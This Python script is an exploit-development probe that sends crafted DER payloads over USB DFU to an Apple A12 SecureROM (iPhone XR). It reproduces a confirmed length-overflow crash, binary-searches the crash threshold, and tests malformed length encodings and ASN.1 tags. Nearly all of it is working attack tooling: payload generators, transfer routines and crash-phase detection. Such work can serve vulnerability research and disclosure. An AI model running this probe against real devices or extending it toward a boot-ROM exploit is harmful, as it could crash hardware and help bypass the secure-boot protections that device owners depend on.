#!/usr/bin/env python3
"""
A12 SecureROM DER Length Overflow — Targeted Crash Probe
=========================================================
CONFIRMED: Payload b"\x30\x84\xFF\xFF\xFF\xFF" + zeroes crashes the device.
Normal payloads return to DFU after ~3562ms manifest processing.

This probe systematically explores the DER length overflow to:
  1. REPRODUCE the crash (confirm it's reliable)
  2. BINARY SEARCH the exact threshold value that crashes
  3. TEST different length encoding forms (2/3/4/5 byte)
  4. TEST if crash happens during DNLOAD or MANIFEST phase
  5. MEASURE timing differences before crash
  6. TEST with different DER tag types (not just SEQUENCE)

IMPORTANT: Each crash requires manual DFU re-entry!
           The probe is designed to run ONE test at a time.
"""

import sys, os, time, struct, json, traceback
from datetime import datetime
from pathlib import Path

RESULTS_DIR = Path(__file__).parent.resolve() / "results"
RESULTS_DIR.mkdir(exist_ok=True)

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
DFU_DNLOAD = 1; DFU_GET_STATUS = 3; DFU_CLR_STATUS = 4
DFU_GET_STATE = 5; DFU_ABORT = 6

LOG_FILE = RESULTS_DIR / "der_crash_probe_log.txt"
RESULT_FILE = RESULTS_DIR / "der_crash_probe.json"


class DERCrashProbe:
    def __init__(self):
        self.dev = None
        self.lines = []
        self.findings = []
        self.results = []

    def log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        line = f"[{ts}] [{level:4s}] {msg}"
        print(line, flush=True)
        self.lines.append(line)

    def finding(self, title, detail, severity="CRITICAL"):
        f = {"title": title, "detail": detail, "severity": severity,
             "timestamp": datetime.now().isoformat()}
        self.findings.append(f)
        self.log(f"*** [{severity}] {title}: {detail}", "FIND")

    def connect(self):
        for attempt in range(5):
            backend = usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)
            self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend)
            if self.dev:
                try: self.dev.set_configuration()
                except: pass
                sn = self.dev.serial_number[:60]
                self.log(f"DFU connected: {sn}")
                return True
            time.sleep(1)
        self.log("DFU not found!", "ERR")
        return False

    def ctrl(self, bmRT, bReq, wVal, wIdx, d_or_l, timeout=2000):
        try:
            r = self.dev.ctrl_transfer(bmRT, bReq, wVal, wIdx, d_or_l, timeout=timeout)
            if isinstance(r, int): return (None, None)
            return (bytes(r), None)
        except usb.core.USBTimeoutError: return (None, "TIMEOUT")
        except usb.core.USBError as e:
            if e.errno == 32 or "pipe" in str(e).lower(): return (None, "STALL")
            return (None, str(e))

    def get_status(self):
        data, err = self.ctrl(0xA1, DFU_GET_STATUS, 0, 0, 6)
        if data and len(data) >= 6:
            return {"bStatus": data[0], "bState": data[4],
                    "poll_ms": data[1]|(data[2]<<8)|(data[3]<<16),
                    "raw": data.hex()}
        return None

    def dnload(self, payload, block=0):
        _, err = self.ctrl(0x21, DFU_DNLOAD, block, 0, payload)
        return err is None

    def reset_to_idle(self):
        for attempt in range(20):
            time.sleep(0.030)
            st = self.get_status()
            if st and st["bState"] == 2: return True
            if st and st["bState"] == 10:
                self.ctrl(0x21, DFU_CLR_STATUS, 0, 0, 0)
                time.sleep(0.050); continue
            if st and st["bState"] == 8:
                return self._reconnect_dfu()
            if st and st["bState"] in (5, 3):
                self.ctrl(0x21, DFU_ABORT, 0, 0, 0)
                time.sleep(0.050); continue
            if st is None:
                return self._reconnect_dfu()
            self.ctrl(0x21, DFU_ABORT, 0, 0, 0)
            time.sleep(0.050)
        st = self.get_status()
        return st is not None and st["bState"] == 2

    def _reconnect_dfu(self):
        self.log("    _reconnect: ABORT + USB reset cycle...")
        try:
            if self.dev:
                self.dev.ctrl_transfer(0x21, DFU_ABORT, 0, 0, 0, timeout=2000)
                time.sleep(0.1)
        except: pass
        try:
            if self.dev: self.dev.reset()
        except: pass
        time.sleep(2.0)
        try:
            if self.dev: usb.util.dispose_resources(self.dev)
        except: pass
        self.dev = None
        
        for attempt in range(10):
            time.sleep(0.5)
            try:
                backend = usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)
                dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend)
                if dev:
                    self.dev = dev
                    try: self.dev.set_configuration()
                    except: pass
                    time.sleep(0.3)
                    r = self.dev.ctrl_transfer(0xA1, DFU_GET_STATUS, 0, 0, 6, timeout=2000)
                    state = r[4] if len(r) >= 5 else -1
                    self.log(f"    _reconnect: attempt {attempt}: state={state}")
                    if state == 2: return True
                    if state == 8:
                        try: self.dev.ctrl_transfer(0x21, DFU_ABORT, 0, 0, 0, timeout=2000)
                        except: pass
                        time.sleep(0.1)
                        try: self.dev.reset()
                        except: pass
                        time.sleep(2.0)
                        try: usb.util.dispose_resources(self.dev)
                        except: pass
                        self.dev = None; continue
                    if state == 10:
                        self.dev.ctrl_transfer(0x21, DFU_CLR_STATUS, 0, 0, 0, timeout=2000)
                        time.sleep(0.1)
                        r2 = self.dev.ctrl_transfer(0xA1, DFU_GET_STATUS, 0, 0, 6, timeout=2000)
                        if len(r2) >= 5 and r2[4] == 2: return True
            except Exception as e:
                self.log(f"    _reconnect: attempt {attempt}: {e}", "WARN")
        self.log("    _reconnect: FAILED", "ERR")
        return False

    def device_alive(self):
        """Check if device is still on USB."""
        try:
            backend = usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)
            d = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend)
            return d is not None
        except:
            return False

    def send_and_observe(self, payload, name="test", wait_crash_sec=8):
        """
        Send payload through full DFU manifest flow.
        Carefully monitors for crash vs normal completion.
        
        Returns result dict with:
          - crashed: True if device disappeared
          - manifest_time_ms: time of manifest phase
          - all intermediate states
        """
        result = {"name": name, "size": len(payload), "payload_hex": payload[:64].hex(),
                  "payload_preview": repr(payload[:32])}
        
        # Ensure idle
        if not self.reset_to_idle():
            result["error"] = "cannot_reach_idle"
            self.log(f"  {name}: SKIP (not idle)", "WARN")
            return result

        self.log(f"  {name}: Sending {len(payload)}B payload...")
        
        # === PHASE 1: DNLOAD ===
        t_start = time.perf_counter()
        
        block_size = 4096
        block = 0
        remaining = payload
        while remaining:
            chunk = remaining[:block_size]
            remaining = remaining[block_size:]
            ok = self.dnload(chunk, block=block)
            if not ok:
                result["error"] = f"dnload_fail_block_{block}"
                return result
            st = self.get_status()
            if st is None:
                t_gone = (time.perf_counter() - t_start) * 1000
                result["crashed"] = True
                result["crash_phase"] = "DNLOAD_STATUS"
                result["crash_time_ms"] = round(t_gone, 1)
                self.finding("CRASH during DNLOAD", f"{name}: device gone after GET_STATUS in DNLOAD phase @ {t_gone:.0f}ms")
                return result
            if st["bState"] == 10:
                result["error"] = "dnload_error"
                result["state_after_dnload"] = st
                return result
            time.sleep(max(0.010, st["poll_ms"]/1000.0) + 0.010)
            for _ in range(5):
                st = self.get_status()
                if st and st["bState"] == 5: break
                if st is None:
                    t_gone = (time.perf_counter() - t_start) * 1000
                    result["crashed"] = True
                    result["crash_phase"] = "DNLOAD_POLL"
                    result["crash_time_ms"] = round(t_gone, 1)
                    self.finding("CRASH during DNLOAD poll", f"{name}: device gone @ {t_gone:.0f}ms")
                    return result
                time.sleep(0.060)
            block += 1

        t_dnload = (time.perf_counter() - t_start) * 1000
        result["dnload_time_ms"] = round(t_dnload, 1)
        result["blocks"] = block
        self.log(f"    DNLOAD complete: {block} blocks, {t_dnload:.0f}ms")

        # === PHASE 2: TRIGGER MANIFEST ===
        ok = self.dnload(b"", block=block)
        if not ok:
            result["error"] = "manifest_trigger_fail"
            return result

        t_manifest_start = time.perf_counter()
        
        # GET_STATUS to enter manifest-sync
        st = self.get_status()
        if st is None:
            t_gone = (time.perf_counter() - t_start) * 1000
            result["crashed"] = True
            result["crash_phase"] = "MANIFEST_SYNC"
            result["crash_time_ms"] = round(t_gone, 1)
            self.finding("CRASH at MANIFEST-SYNC", f"{name}: device gone when entering manifest @ {t_gone:.0f}ms")
            return result
        
        result["manifest_sync_state"] = st["bState"]
        self.log(f"    MANIFEST-SYNC: state={st['bState']}, poll={st['poll_ms']}ms")
        
        if st["bState"] == 6:  # dfuMANIFEST-SYNC
            time.sleep(max(0.010, st["poll_ms"]/1000.0) + 0.010)
            st = self.get_status()
            if st is None:
                t_gone = (time.perf_counter() - t_start) * 1000
                result["crashed"] = True
                result["crash_phase"] = "MANIFEST_ENTER"
                result["crash_time_ms"] = round(t_gone, 1)
                self.finding("CRASH entering MANIFEST", f"{name}: device gone entering manifest @ {t_gone:.0f}ms")
                return result
            
            result["manifest_state"] = st["bState"]
            result["manifest_poll_ms"] = st["poll_ms"]
            self.log(f"    MANIFEST: state={st['bState']}, poll={st['poll_ms']}ms")
            
            if st["bState"] == 7:  # dfuMANIFEST
                # This is where SecureROM processes our data (~3000ms)
                # CRITICAL: Respect bwPollTimeout! Early GET_STATUS may
                #           interrupt processing and prevent the crash.
                manifest_poll = st["poll_ms"]
                
                # Wait the FULL poll timeout before checking
                full_wait = max(0.5, manifest_poll / 1000.0) + 0.500
                self.log(f"    Waiting full {full_wait:.1f}s (poll={manifest_poll}ms)...")
                
                # Sleep the full time WITHOUT sending any USB traffic
                time.sleep(full_wait)
                
                # NOW check if device survived
                try:
                    st_check = self.get_status()
                    if st_check is None:
                        t_gone = (time.perf_counter() - t_manifest_start) * 1000
                        result["crashed"] = True
                        result["crash_phase"] = "MANIFEST_PROCESSING"
                        result["crash_time_ms"] = round(t_gone, 1)
                        
                        # Double-check: is it really gone?
                        time.sleep(2)
                        alive = self.device_alive()
                        result["still_gone_after_2s"] = not alive
                        
                        self.finding("CRASH during MANIFEST processing",
                                    f"{name}: device gone after {full_wait:.1f}s manifest @ {t_gone:.0f}ms")
                        return result
                    result["post_manifest_state"] = st_check["bState"]
                except Exception as e:
                    t_gone = (time.perf_counter() - t_manifest_start) * 1000
                    result["crashed"] = True
                    result["crash_phase"] = "MANIFEST_PROCESSING_EXCEPTION"
                    result["crash_time_ms"] = round(t_gone, 1)
                    result["exception"] = str(e)
                    return result
        elif st["bState"] == 10:  # dfuERROR — rejected early
            result["early_reject"] = True
            self.log(f"    EARLY REJECT: payload rejected before manifest")
        
        t_manifest_end = time.perf_counter()
        manifest_time = (t_manifest_end - t_manifest_start) * 1000
        result["manifest_time_ms"] = round(manifest_time, 1)
        result["total_time_ms"] = round((t_manifest_end - t_start) * 1000, 1)
        
        # Final state
        try:
            st_final = self.get_status()
            if st_final:
                result["final_state"] = st_final["bState"]
                result["crashed"] = False
                self.log(f"    SURVIVED: final_state={st_final['bState']}, manifest={manifest_time:.1f}ms")
            else:
                # Device gone after manifest
                result["crashed"] = True
                result["crash_phase"] = "POST_MANIFEST"
                self.finding("CRASH post-manifest", f"{name}: device gone after manifest completed")
        except:
            result["crashed"] = True
            result["crash_phase"] = "POST_MANIFEST_EXCEPTION"
        
        self.results.append(result)
        return result

    # ============================================================
    # Payload Generators for DER Length Overflow
    # ============================================================

    @staticmethod  
    def make_der_len_payload(length_bytes, tag=0x30, pad_size=512):
        """
        Create a DER structure with a specific raw length encoding.
        tag: ASN.1 tag byte (0x30 = SEQUENCE, 0x04 = OCTET STRING, etc.)
        length_bytes: raw bytes for the length field
        Pads to pad_size with zeroes.
        """
        header = bytes([tag]) + length_bytes
        pad = b"\x00" * max(0, pad_size - len(header))
        return header + pad

    def generate_test_suite(self, mode="full"):
        """
        Generate the test suite based on mode.
        
        Modes:
          confirm   — Just reproduce the original crash (1 test)
          boundary  — Binary search for crash boundary (progressive)
          encodings — Test different length encoding forms
          tags      — Test different ASN.1 tags with huge length
          full      — All tests in order
          safe      — Only tests expected NOT to crash (timing analysis)
          remaining — Run remaining fuzzer cases 16-71 from img4_fuzzer
        """
        tests = []

        if mode in ("confirm", "full"):
            # === CONFIRM: Reproduce the original crash ===
            tests.append(("CONFIRM_0xFFFFFFFF",
                self.make_der_len_payload(b"\x84\xFF\xFF\xFF\xFF")))
        
        if mode in ("safe", "full"):
            # === SAFE: Tests that should NOT crash (baseline) ===
            # Normal small lengths
            tests.append(("safe_len_0x00",
                self.make_der_len_payload(b"\x00")))  # 0 bytes
            tests.append(("safe_len_0x10",
                self.make_der_len_payload(b"\x10")))  # 16 bytes
            tests.append(("safe_len_0x7F",
                self.make_der_len_payload(b"\x7F")))  # 127 bytes
            tests.append(("safe_len_0x81_0x80",
                self.make_der_len_payload(b"\x81\x80")))  # 128 bytes
            tests.append(("safe_len_0x82_0x01_0x00",
                self.make_der_len_payload(b"\x82\x01\x00")))  # 256 bytes
            tests.append(("safe_len_0x82_0x02_0x00",
                self.make_der_len_payload(b"\x82\x02\x00")))  # 512 bytes (=pad)
            tests.append(("safe_len_0x82_0x10_0x00",
                self.make_der_len_payload(b"\x82\x10\x00")))  # 4096 bytes

        if mode in ("boundary", "full"):
            # === BOUNDARY: Find the exact crash threshold ===
            # We know: small lengths → survive, 0xFFFFFFFF → crash
            # Binary search key values:
            
            # 2-byte lengths (0x81 XX): max = 255 — probably safe
            tests.append(("boundary_2b_0xFF",
                self.make_der_len_payload(b"\x81\xFF")))  # 255
            
            # 3-byte lengths (0x82 XX XX): max = 65535
            tests.append(("boundary_3b_0xFFFF",
                self.make_der_len_payload(b"\x82\xFF\xFF")))  # 65535
            tests.append(("boundary_3b_0x8000",
                self.make_der_len_payload(b"\x82\x80\x00")))  # 32768
            tests.append(("boundary_3b_0x1000",
                self.make_der_len_payload(b"\x82\x10\x00")))  # 4096
            
            # 4-byte lengths (0x83 XX XX XX): max = 16777215
            tests.append(("boundary_4b_0x010000",
                self.make_der_len_payload(b"\x83\x01\x00\x00")))  # 65536
            tests.append(("boundary_4b_0x100000",
                self.make_der_len_payload(b"\x83\x10\x00\x00")))  # 1048576
            tests.append(("boundary_4b_0xFFFFFF",
                self.make_der_len_payload(b"\x83\xFF\xFF\xFF")))  # 16777215
            
            # 5-byte lengths (0x84 XX XX XX XX): max = 4294967295
            # These are the most interesting — same encoding as the crash
            tests.append(("boundary_5b_0x01000000",
                self.make_der_len_payload(b"\x84\x01\x00\x00\x00")))  # 16MB
            tests.append(("boundary_5b_0x10000000",
                self.make_der_len_payload(b"\x84\x10\x00\x00\x00")))  # 256MB
            tests.append(("boundary_5b_0x7FFFFFFF",
                self.make_der_len_payload(b"\x84\x7F\xFF\xFF\xFF")))  # 2GB-1 (max signed 32)
            tests.append(("boundary_5b_0x80000000",
                self.make_der_len_payload(b"\x84\x80\x00\x00\x00")))  # 2GB (sign flip!)
            tests.append(("boundary_5b_0xC0000000",
                self.make_der_len_payload(b"\x84\xC0\x00\x00\x00")))  # 3GB
            tests.append(("boundary_5b_0xFFFFFFFE",
                self.make_der_len_payload(b"\x84\xFF\xFF\xFF\xFE")))  # max-1
            tests.append(("boundary_5b_0xFFFFFFFF",
                self.make_der_len_payload(b"\x84\xFF\xFF\xFF\xFF")))  # max (KNOWN CRASH)
        
        if mode in ("encodings", "full"):
            # === ENCODING FORMS: Invalid/unusual DER length encodings ===
            
            # 0x80 = indefinite length (BER, not valid DER)
            tests.append(("enc_indefinite_0x80",
                self.make_der_len_payload(b"\x80")))
            
            # 0x85+ = 5+ byte length (invalid in standard DER)
            tests.append(("enc_5byte_0x85",
                self.make_der_len_payload(b"\x85\xFF\xFF\xFF\xFF\xFF")))
            tests.append(("enc_6byte_0x86",
                self.make_der_len_payload(b"\x86\xFF\xFF\xFF\xFF\xFF\xFF")))
            
            # 0xFF = reserved length byte
            tests.append(("enc_reserved_0xFF",
                self.make_der_len_payload(b"\xFF")))
            
            # Non-minimal encoding (0x81 for small value — DER violation)
            tests.append(("enc_nonminimal_0x81_0x01",
                self.make_der_len_payload(b"\x81\x01")))  # 1 in 2-byte form
            
            # Zero-padded length
            tests.append(("enc_zeropad_0x84_00000001",
                self.make_der_len_payload(b"\x84\x00\x00\x00\x01")))  # 1 in 5-byte form
        
        if mode in ("tags", "full"):
            # === DIFFERENT TAGS with huge length ===
            # If SEQUENCE crashes, do other tags crash too?
            huge_len = b"\x84\xFF\xFF\xFF\xFF"
            
            tests.append(("tag_OCTET_STRING_0x04",
                self.make_der_len_payload(huge_len, tag=0x04)))
            tests.append(("tag_INTEGER_0x02",
                self.make_der_len_payload(huge_len, tag=0x02)))
            tests.append(("tag_BITSTRING_0x03",
                self.make_der_len_payload(huge_len, tag=0x03)))
            tests.append(("tag_IA5STRING_0x16",
                self.make_der_len_payload(huge_len, tag=0x16)))
            tests.append(("tag_SET_0x31",
                self.make_der_len_payload(huge_len, tag=0x31)))
            tests.append(("tag_CONTEXT_0_0xA0",
                self.make_der_len_payload(huge_len, tag=0xA0)))
            tests.append(("tag_CONTEXT_1_0xA1",
                self.make_der_len_payload(huge_len, tag=0xA1)))
            tests.append(("tag_NULL_0x05_huge",
                self.make_der_len_payload(huge_len, tag=0x05)))

        return tests

    def run_single(self, test_name, payload):
        """Run a single test case with full monitoring."""
        self.log(f"\n{'='*60}")
        self.log(f"TEST: {test_name}")
        self.log(f"  Payload: {len(payload)}B, header: {payload[:8].hex()}")
        self.log(f"{'='*60}")
        
        result = self.send_and_observe(payload, name=test_name)
        
        if result.get("crashed"):
            self.log(f"\n  *** CRASH! Phase: {result.get('crash_phase','?')}, "
                    f"Time: {result.get('crash_time_ms','?')}ms ***", "CRIT")
            self.log(f"  Device needs manual DFU re-entry!", "CRIT")
        elif result.get("error"):
            self.log(f"  Error: {result['error']}", "WARN")
        else:
            ms = result.get("manifest_time_ms", 0)
            fs = result.get("final_state", "?")
            self.log(f"  SURVIVED: manifest={ms:.1f}ms, final_state={fs}")
        
        return result

    def run_suite(self, mode="safe", start_at=0, max_tests=None):
        """
        Run test suite. Stops on first crash.
        
        Usage examples:
          --mode safe        : Only safe tests (no crashes expected)
          --mode confirm     : Just reproduce the crash
          --mode boundary    : Binary search for crash threshold
          --mode encodings   : Test different length encodings
          --mode tags        : Test different ASN.1 tags with huge length
          --mode full        : Everything (will crash on boundary tests!)
        """
        tests = self.generate_test_suite(mode)
        total = len(tests)
        
        if max_tests:
            tests = tests[:max_tests]
        if start_at > 0:
            tests = tests[start_at:]
        
        self.log(f"\n{'#'*60}")
        self.log(f"DER LENGTH OVERFLOW CRASH PROBE — A12 SecureROM")
        self.log(f"Mode: {mode}, Tests: {len(tests)}/{total}")
        self.log(f"{'#'*60}\n")
        
        if not self.connect():
            self.log("Cannot connect to DFU device!", "ERR")
            return
        
        for i, (name, payload) in enumerate(tests):
            idx = start_at + i
            self.log(f"\n--- Test {idx+1}/{total} ---")
            result = self.run_single(name, payload)
            result["index"] = idx
            
            if result.get("crashed"):
                self.log(f"\n{'!'*60}")
                self.log(f"DEVICE CRASHED on test '{name}'!")
                self.log(f"Re-enter DFU and re-run with --start {idx+1}")
                self.log(f"{'!'*60}")
                break
            
            # Check device health between tests
            time.sleep(0.5)
            if not self.device_alive():
                self.log(f"Device disappeared after test '{name}'!", "ERR")
                result["crashed"] = True
                result["crash_phase"] = "DELAYED"
                break
        
        self.save_results()

    def save_results(self):
        data = {
            "probe": "der_crash_probe",
            "device": "A12 T8020 (iPhone XR)",
            "timestamp": datetime.now().isoformat(),
            "results": self.results,
            "findings": self.findings,
            "summary": {
                "total_tests": len(self.results),
                "crashes": sum(1 for r in self.results if r.get("crashed")),
                "survived": sum(1 for r in self.results if not r.get("crashed") and not r.get("error")),
                "errors": sum(1 for r in self.results if r.get("error")),
            }
        }
        
        # Append to existing results if present
        existing = []
        if RESULT_FILE.exists():
            try:
                with open(RESULT_FILE, "r") as f:
                    old = json.load(f)
                    existing = old.get("all_runs", [])
            except: pass
        
        existing.append(data)
        
        with open(RESULT_FILE, "w") as f:
            json.dump({"all_runs": existing, "latest": data}, f, indent=2)
        
        with open(LOG_FILE, "a") as f:
            f.write("\n".join(self.lines) + "\n")
        
        self.log(f"\nResults: {RESULT_FILE}")
        self.log(f"Log: {LOG_FILE}")
        
        # Print summary
        self.log(f"\n{'='*60}")
        self.log(f"SUMMARY")
        self.log(f"  Tests run:  {data['summary']['total_tests']}")
        self.log(f"  Survived:   {data['summary']['survived']}")
        self.log(f"  Crashed:    {data['summary']['crashes']}")
        self.log(f"  Errors:     {data['summary']['errors']}")
        
        if self.findings:
            self.log(f"\nFINDINGS:")
            for f in self.findings:
                self.log(f"  [{f['severity']}] {f['title']}: {f['detail']}")
        
        # Print timing comparison for survived tests
        survived = [r for r in self.results if not r.get("crashed") and not r.get("error")]
        if survived:
            self.log(f"\nTIMING COMPARISON:")
            for r in survived:
                ms = r.get("manifest_time_ms", 0)
                fs = r.get("final_state", "?")
                mp = r.get("manifest_poll_ms", -1)
                self.log(f"  {r['name']:40s} | {ms:7.1f}ms | poll={mp}ms | state={fs}")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="A12 DER Length Overflow Crash Probe")
    parser.add_argument("--mode", default="safe", 
                       choices=["confirm", "safe", "boundary", "encodings", "tags", "full"],
                       help="Test mode (default: safe)")
    parser.add_argument("--start", type=int, default=0,
                       help="Start at test index N (for resuming after crash)")
    parser.add_argument("-n", "--max", type=int, default=None,
                       help="Maximum number of tests to run")
    parser.add_argument("--single", type=str, default=None,
                       help="Run a single named test from the suite")
    args = parser.parse_args()

    probe = DERCrashProbe()
    
    if args.single:
        # Find and run single test
        tests = probe.generate_test_suite("full")
        for name, payload in tests:
            if name == args.single:
                if not probe.connect():
                    print("DFU not found!")
                    return
                probe.run_single(name, payload)
                probe.save_results()
                return
        print(f"Test '{args.single}' not found. Available:")
        for name, _ in tests:
            print(f"  {name}")
        return
    
    probe.run_suite(mode=args.mode, start_at=args.start, max_tests=args.max)


if __name__ == "__main__":
    main()
